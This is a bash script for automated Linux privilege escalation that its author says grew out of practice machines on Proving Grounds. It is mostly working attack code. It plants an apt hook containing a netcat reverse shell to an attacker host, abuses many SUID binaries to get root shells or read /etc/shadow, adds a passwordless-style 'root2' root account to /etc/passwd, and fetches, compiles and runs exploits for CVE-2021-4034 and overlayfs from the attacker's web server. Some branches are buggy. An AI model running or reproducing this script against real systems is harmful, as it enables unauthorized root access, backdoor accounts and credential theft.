#!/bin/bash

#As I do different boxes this will continue to be updated...
#Many of the exploits came from doing boxes on Proving Grounds Play and Practice
#Built by OvergrownCarrot1 Thanks for using

now=$(date)
i=$(whoami)
d=$(id)

cd /tmp

echo -e '\E[31;40m' "Script is not an end all be all, you may actually need to do some manual enumeration and exploitation"; tput sgr0
echo -e '\E[32;40m'"Make sure linpeas is in the folder you have your web server on and is called linpeas.sh (ex: python3 -m http.server 8080)";tput sgr0
echo -e '\E[31;40m' "Segmentation fault or critical error is ok... let the script continue running";tput sgr0
sleep 2
echo -e '\E[31;40m' "LHOST"; tput sgr0
read LHOST
echo -e '\E[31;40m' "Web server LPORT"; tput sgr0
read LPORT

echo -e '\E[32;40m' "Before Downloading linpeas looking for easy wins";tput sgr0
echo "Current user is $i within group $d" > info.txt
echo "Script last ran on $now" >> info.txt
echo -e '\E[31;40m' "Looking at cronjobs";tput sgr0
cat /etc/crontab >> info.txt
if grep "apt-get" info.txt; then
	ls -la /etc/apt | grep apt.conf.d
	read -p "Is file writeable by user? (y/n)" answer
	if [ $answer = y ]; then
		echo -e '\E[31;40m' "If this does not work you can follow writeup here https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
		cd /etc/apt/apt.conf.d
		echo -e '\E[31;40m' "What port do you want to make a reverse shell on (LPORT)?";tput sgr0
		read LPORT1
		echo -e '\E[32;40m' "Putting file named pwn into /etc/apt/apt.conf.d"
		echo -e "apt::Update::Pre-Invoke" "{\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT1 >/tmp/f\"};" > pwn
		echo -e '\E[31;40m' "Wait for reverse shell on $LHOST port $LPORT1 (remember will take as long as cronjob takes to run)"; tput sgr0
		cat /etc/apt/apt.conf.d/pwn
		cd /tmp
	else
		echo -e '\E[31;40m' "Exploit should not work, can try manually if you would like"; tput sgr0
		echo -e '\E[32;40m' "If trying manually here you go https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
	fi
fi

echo -e '\E[31;40m' "Looking at SUID Bits"; tput sgr0
echo -e '\E[31;40m' "Ran SUID bits with user $i on $now" >> info.txt; tput sgr0
read -p "If any SUID bits found do you want to automatically exploit them for priv esc? (y/n):" answer
if [ $answer = n ] ; then
	find / -perm -u=s -type f 2>/dev/null >> info.txt
	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
else
	find / -perm -u=s -type f 2>/dev/null >> info.txt
	echo -e '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
	echo -e '\E[32;40m' "This could take a while, script is not stuck"; tput sgr0
	if grep "/usr/bin/find" info.txt; then
		cd /usr/bin
		./find . -exec /bin/bash -p \; -quit
	elif grep "/usr/bin/bash" info.txt; then
		cd /usr/bin
		./bash -p
	elif grep "/usr/bin/awk" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer 
		cd /usr/bin
		./awk '//' "$LFILE"
	elif grep "/usr/bin/base32" info.txt ; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		base32 "$LFILE" | base32 --decode
	elif grep "/usr/bin/base64" info.txt ; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		base64 "$LFILE" | base64 --decode
	elif grep "/usr/bin/basenc" info.txt ; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		basenc --base64 $LFILE | basenc -d --base64
	elif grep "busybox" info.txt; then
		cd /usr/bin
		./busybox sh
	elif grep "/usr/bin/cat" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./cat "$LFILE"
	elif grep "/usr/bin/chmod" info.txt ; then
		cd /usr/bin
		LFILE=/etc/passwd
		./chmod 6777 $LFILE
		echo "User root2 added to /etc/passwd with password toor"
		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
		LFILE=/etc/shadow
		./chmod 6777 $LFILE
		echo "User root2 added to /etc/shadow with password toor"
		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
		echo '\E[31;40m' "Both passwd and shadow are now writeable, feel free to do what you will with it"; tput sgr0
	elif grep "cpulimit" info.txt ; then
		cd /usr/bin
		./cpulimit -l 100 -f -- /bin/sh -p
		cd /usr/sbin
		./cpulimit -l 100 -f -- /bin/sh -p
	elif grep "chroot" info.txt; then
		cd /usr/bin
		./chroot / /bin/sh -p
		cd /usr/sbin
		./chroot / /bin/sh -p
	elif grep "/usr/bin/wget" info.txt; then
		TF=$(mktemp)
		chmod +x $TF
		echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
		./wget --use-askpass=$TF 0
	elif grep "/usr/bin/vim"; then
		cd /usr/bin
		./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
	elif grep "unzip"; then
		cd /usr/bin
		./unzip -K shell.zip
		./sh -p
	elif grep "systemctl" info.txt; then
		TF=$(mktemp).service
		echo '[Service]
		Type=oneshot
		ExecStart=/bin/sh -c "id > /tmp/output"
		[Install]
		WantedBy=multi-user.target' > $TF
		cd /usr/bin
		./systemctl link $TF
		./systemctl enable --now $TF
	elif grep "agetty" info.txt; then
		cd /usr/bin
		./agetty -o -p -l /bin/sh -a root tty
	elif grep "alpine" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./alpine -F "$LFILE"
	elif grep "/usr/bin/ar" info.txt; then
		TF=$(mktemp -u)
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./ar r "$TF" "$LFILE"
		cat "$TF"
	elif grep "/usr/bin/as" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./as @$LFILE
	elif grep "ascii-xfr" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./ascii-xfr -ns "$LFILE"
	elif grep "/usr/bin/ash" info.txt; then
		cd /usr/bin
		./ash
	elif grep "aspell" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./aspell -c "$LFILE"
	elif grep "atobm" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
	elif grep "/usr/bin/awk" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./awk '//' "$LFILE"
		echo -e '\E[31;40m' "May be able to get a shell with limited SUID by using command ./awk 'BEGIN {system(\"/bin/sh\")}'"; tput sgr0
	elif grep "basez" info.txt;  then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./basez "$LFILE" | basez --decode
	elif grep "/usr/bin/bash" info.txt; then
		cd /usr/bin
		./bash -p
	elif grep "/usr/bin/bc" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./bc -s $LFILE
		quit
	elif grep "bridge" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./bridge -b "$LFILE"
	elif grep "bzip2" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./bzip2 -c $LFILE | bzip2 -d
	elif grep "cabal" info.txt; then
		cd /usr/bin
		./cabal exec -- /bin/sh -p
	elif grep "capsh" info.txt; then
		cd /usr/bin
		./capsh --gid=0 --uid=0 --
	elif grep "choom" info.txt; then
		cd /usr/bin
		./choom -n 0 -- /bin/sh -p
	elif grep "chown" info.txt; then
		cd /usr/bin
		LFILE=/etc/passwd
		./chown $(id -un):$(id -gn) $LFILE
		echo "User root2 added to /etc/passwd with password toor"
		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
		LFILE=/etc/shadow
		./chown $(id -un):$(id -gn) $LFILE
		echo "User root2 added to /etc/shadow with password toor"
		echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
		echo '\E[31;40m' "Both passwd and shadow are now writeable, feel free to do what you will with it"; tput sgr0
		cat /etc/passwd | grep -i root2
		cat /etc/shadow | grep -i root2
	elif grep "chroot" info.txt; then
		cd /usr/bin
		./chroot / /bin/sh -p
	elif grep "cmp" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./cmp $LFILE /dev/zero -b -l
	elif grep "column" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./column $LFILE
	elif grep "comm" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		comm $LFILE /dev/null 2>/dev/null
	elif grep "/usr/bin/cp" info.txt; then
		echo '\E[31;40m' "Going through a few different things, cp has a lot"
		cd /usr/bin
		LFILE=/etc/passwd
		echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
		echo -e '\E[31;40m' "User root2 added to /etc/passwd with password toor"
		LFILE=/etc/shadow
		echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" | ./cp /dev/stdin "$LFILE"
		echo -e '\E[31;40m' "User root2 added to /etc/shadow with password toor"
		echo -e '\E[32;40m' "Trying another way incase that didn't work"
		TF=$(mktemp)
		echo "root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash" > $TF
		./cp $TF $LFILE
		LFILE=/etc/passwd
		./cp $TF $LFILE
		LFILE=/etc/shadow
		./cp $TF $LFILE
		echo -e '\E[31;40m' "User root2 added to /etc/shadow and /etc/passwd with password toor"
		./cp --attributes-only --preserve=all ./cp "$LFILE"
		LFILE=/etc/passwd
		./cp --attributes-only --preserve=all ./cp "$LFILE"
		echo -e '\E[31;40m' "Should have suid permissions on both /etc/passwd and /etc/shadow"
		echo -e '\E[31;40m' "Doing one last thing, making suid permissions on find and seeing if we can get root like that"
		LFILE=/usr/bin/find
		./cp --attributes-only --preserve=all ./cp "$LFILE"
		./find . -exec /bin/bash -p \; -quit
		cat /etc/passwd | grep -i root2
		cat /etc/shadow | grep -i root2
	elif grep "csplit" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		csplit $LFILE 1
		cat xx01
	elif grep "csvtool" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./csvtool trim t $LFILE
	elif grep "cupsfilter" info.txt; then
		cd /usr/bin
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
	elif grep "/usr/bin/curl" info.txt; then
		read -p "File to get from attacker machine (ex: shell.elf):" answer
		URL=http://$LHOST:$LPORT/$answer
		LFILE=$answer
		/usr/bin/curl $URL -o /tmp/$LFILE
	elif grep "cut" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./cut -d "" -f1 "$LFILE"
	elif grep "dash" info.txt; then
		cd /usr/bin
		./dash -p
	elif grep "/usr/bin/date" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./date -f $LFILE
	elif grep "/usr/bin/dd" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		echo "data" | ./dd of=$LFILE
	elif grep "debugfs" info.txt; then
		cd /usr/bin
		./debugfs
		!/bin/sh
	elif grep "dialog" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./dialog --textbox "$LFILE" 0 0
	elif grep "/usr/bin/diff" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./diff --line-format=%L /dev/null $LFILE
	elif grep "/usr/bin/dig" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./dig -f $LFILE
	elif grep "dmsetup" info.txt; then
		cd /usr/bin
		./dmsetup "create base <<EOF
		0 3534848 linear /dev/loop0 94208
		EOF
		./dmsetup ls --exec /bin/sh -p -s'"
	elif grep "/usr/bin/docker" info.txt; then
		cd /usr/bin
		read -p "Docker type (ex: alpine):" answer
		./docker run -v /:/mnt --rm -it $answer chroot /mnt sh
	elif grep "dosbox" info.txt; then
		LFILE=/etc/passwd
		echo -e '\E[31;40m' "Putting user root2:toor into /etc/passwd and /etc/shadow"
		./dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
		LFILE=/etc/shadow
		./dosbox -c 'mount c /' -c "echo root2:\`openssl passwd toor\`:0:0:root:/root:/bin/bash >c:$LFILE" -c exit
		cat /etc/passwd | grep -i root2
		cat /etc/shadow | grep -i root2
	elif grep "/usr/bin/ed" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./ed file_to_read
		,p
		q
	elif grep "efax" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./efax -d "$LFILE"
	elif grep "emacs" info.txt; then
		cd /usr/bin
		./emacs -Q -nw --eval '(term "/bin/sh -p")'
	elif grep "/usr/bin/env" info.txt; then
		cd /usr/bin
		./env /bin/sh -p
#KEEP ARP AT THE BOTTOM OF FILE
	elif grep "/usr/bin/arp" info.txt; then
		read -p "What file would you like to view (ex: /etc/shadow):" answer
		LFILE=$answer
		cd /usr/bin
		./arping -v -f "$LFILE"
	fi
fi
if [ "$(id -u)" = "0" ]; then
   echo "You are root, have a nice day" 1>&2
   exit 1
else
	echo "Not root yet, that sucks, lets keep going"
fi
find /etc -writable -ls 2>/dev/null > write.txt
if grep "/etc/fail2ban" write.txt; then
	ls -la /etc/fail2ban | grep action.d
	read -p "Do you have write permissions over folder action.d (y/n):" answer
	if [ $answer = "y" ]; then
		cd /etc/fail2ban
		echo -e '\E[32;40m' "Walkthrough can be found here https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
		sleep 2
		echo -e '\E[31;40m' "Checking jail.conf"
		cat /etc/fail2ban/jail.conf
		cd action.d
		echo -e '\E[32;40m' "Take note of maxretry"
		read -p "Hit enter to continue after looking at maxretry" answer
		echo -e '\E[31;40m' "Renaming iptables-multiport.conf to iptables-multiport.conf.bak"
		mv  iptables-multiport.conf iptables-multiport.conf.bak
		echo -e '\E[31;40m' "Remaking iptables-multiport.conf so you have permissions to it"
		cp iptables-multiport.conf.bak iptables-multiport.conf
		chmod 666 iptables-multiport.conf
		echo -e '\E[31;40m' "Now you need to open iptables-multiport.conf and put a reverse shell in the actionban location (ex: actionban= /usr/bin/nc -e /usr/bin/bash $LHOST $LPORT)"
		sleep 5
		echo -e '\E[32;40m' "After this has been accomplished make sure you start up a listener on your kali machine and fail to login through, this is where maxretry comes into play (ex: if maxretry is 5 you need to fail to login 5 times):"
		sleep 5
		echo -e '\E[31;40m' "Once you have failed to login so many time, you will get a call back from the machine and should be root"
		sleep 5
	else
		echo -e '\E[31;40m' "Not exploitable with fail2ban exploit, if you want to try manually https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
	fi
	exit 1
fi
if grep LEGEND lin.txt
then
	echo -e '\E[31;40m' "lin.txt already exists not running linpeas"; tput sgr0
else
	read -p "Press enter when web server (python3 -m http.server $LPORT) is started on kali machine? (y/n):" 
	cd /tmp
	wget http://$LHOST:$LPORT/linpeas.sh
	echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
	echo -e '\E[31;40m' "Running linpeas with user $i on $now"
	bash linpeas.sh > lin.txt
fi
if grep CVE-2021-4034 lin.txt
then
	echo -e '\E[31;40m' "Vulnerable to Sudo exploit CVE-2021-4034";tput sgr0
	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"
	read -p "Would you like to exploit this vulnerability (y/n):" answer
	if [ $answer = n ] ; then
		echo -e '\E[31;40m' "Not exploiting";tput sgr0
	elif [ $answer = y ] ; then
		echo -e '\E[32;40m' "Trying to download exploit from user machine" ;tput sgr0
		echo -e '\E[31;40m' "Do a 'wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c' to local kali machine and make sure python server is still running" ;tput sgr0
		read -p "Press enter when exploit is downloaded and python server is ready on $LPORT"
		wget http://$LHOST:$LPORT/cve-2021-4034-poc.c
		gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
		./cve-2021-4034-poc
		else
			echo -e '\E[31;40m' "Continuing Script";tput sgr0
	fi
fi

if grep overlayfs lin.txt
then
	echo -e '\E[31;40m' "Most likely vulnerable to Overlayfs"; tput sgr0
	echo -e '\E[31;40m' "Found vulnerability with user $i on $now"
	read -p "Would you like to exploit this vulnerability (y/n):" answer
	if [ $answer = n ] ; then
		echo -e '\E[31;40m' "Not exploiting";tput sgr0
	elif [ $answer = y ] ; then
		echo "Trying to exploit"
		if grep 'kernel:3.13.0' lin.txt
		then
			echo -e '\E[31;40m' "Do a searchsploit -m linux/local/37292.c on kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready" 
			wget http://$LHOST:$LPORT/37292.c
			gcc 37292.c -o 37292
			./37292
		else 
			echo -e '\E[31;40m' "Do a 'searchsploit -m linux/local/39166.c' on kali machine and make sure python server is still running" ;tput sgr0
			read -p "Press enter when exploit is downloaded and python server is ready on $LPORT" 
			wget http://$LHOST:$LPORT/39166.c
			gcc 39166.c -o 39166
			./39166
		fi
	fi
fi

